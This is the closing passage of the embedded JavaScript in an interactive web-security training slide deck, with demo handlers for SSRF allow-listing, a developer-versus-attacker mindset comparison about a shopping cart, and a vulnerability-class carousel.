      <button onclick="document.querySelector('#ssrfDemo input').value = 'https://example.com/api'">Allowed: example.com</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'https://api.myapp.com/v1/data'">Allowed: api.myapp.com</button>
    </div>
  `;
  container.appendChild(samples);
}


// Mindset Demo
function initMindsetDemo() {
  // Make sure the function is globally available
  if (typeof window !== 'undefined') {
    window.showThinking = function(type) {
      const output = document.getElementById('thinkingOutput');
      if (!output) {
        console.log('thinkingOutput element not found');
        return;
      }
      
      console.log('showThinking called with type:', type);
      
      if (type === 'developer') {
        output.innerHTML = `
          <div class="thinking-result developer">
            <h4>👨‍💻 Developer Perspective:</h4>
            <ul>
              <li>"User clicks button → item gets added to cart"</li>
              <li>"Need to update the cart count in the UI"</li>
              <li>"Make sure the button doesn't double-click"</li>
              <li>"Check if item is in stock"</li>
            </ul>
            <p class="thinking-note">Focus: Functionality and user experience</p>
          </div>
        `;
      } else if (type === 'attacker') {
        output.innerHTML = `
          <div class="thinking-result attacker">
            <h4>🔥 Attacker Perspective:</h4>
            <ul>
              <li>"Can I add negative quantities to get money back?"</li>
              <li>"What if I change the product ID to something expensive?"</li>
              <li>"Can I add items that don't exist or are deleted?"</li>
              <li>"What if I spam this 1000 times per second?"</li>
              <li>"Can I add items for other users' carts?"</li>
              <li>"What happens if I modify the price in the request?"</li>
            </ul>
            <p class="thinking-note danger">Focus: How to exploit and break the system</p>
          </div>
        `;
      }
    };
  }
}

// Vulnerability Carousel Demo
let currentVulnIndex = 0;
const totalVulns = 10;

function initVulnCarouselDemo() {
  // Make global functions available
  if (typeof window !== 'undefined') {
    window.nextVuln = nextVuln;
    window.prevVuln = prevVuln;
  }
  
  updateCarousel();
  
  // Add keyboard support
  document.addEventListener('keydown', (e) => {
    // Only if we're on the vuln-classes slide
    const activeSlide = document.querySelector('.slide:target, .slide[data-active="true"]') || 
                       document.querySelector('#vuln-classes');
    if (activeSlide && activeSlide.id === 'vuln-classes') {
      if (e.key === 'ArrowRight' || e.key === ' ' || e.key === 'n' || e.key === 'N') {
        e.preventDefault();
        nextVuln();
      } else if (e.key === 'ArrowLeft' || e.key === 'p' || e.key === 'P') {
        e.preventDefault();
        prevVuln();
      }
    }
  });
}

function nextVuln() {
  if (currentVulnIndex < totalVulns - 1) {
    currentVulnIndex++;
    updateCarousel();
  }
}

function prevVuln() {
  if (currentVulnIndex > 0) {
    currentVulnIndex--;
    updateCarousel();
  }
}

function updateCarousel() {
  const track = document.getElementById('vulnCarousel');
  const counter = document.getElementById('vulnCounter');
  const prevBtn = document.getElementById('prevBtn');
  const nextBtn = document.getElementById('nextBtn');
  
  if (track) {
    // Move carousel track to show current card
    const translateX = -currentVulnIndex * 100;
    track.style.transform = `translateX(${translateX}%)`;
  }
  
  // Update active card styling
  document.querySelectorAll('.vuln-stack-card').forEach((card, index) => {
    card.classList.toggle('active', index === currentVulnIndex);
  });
  
  // Update counter
  if (counter) {
    counter.textContent = `${currentVulnIndex + 1} / ${totalVulns}`;
  }
  
  // Update button states
  if (prevBtn) {
    prevBtn.disabled = currentVulnIndex === 0;
  }
  if (nextBtn) {
    nextBtn.disabled = currentVulnIndex === totalVulns - 1;
  }
}

// Initialize all demos
function initAllDemos() {
  // Wait for DOM to be ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      setTimeout(initAllDemos, 100);
    });
    return;
  }

  initMindsetDemo();
  initFrontendBackendDemo();
  initSecretsDemo();
  initRLSDemo();
  initXSSDemo();
  initRateLimitDemo();
  initHeadersDemo();
  initUploadDemo();
  initSSRFDemo();
  initVulnCarouselDemo();
}
    </script>
  </body>
</html>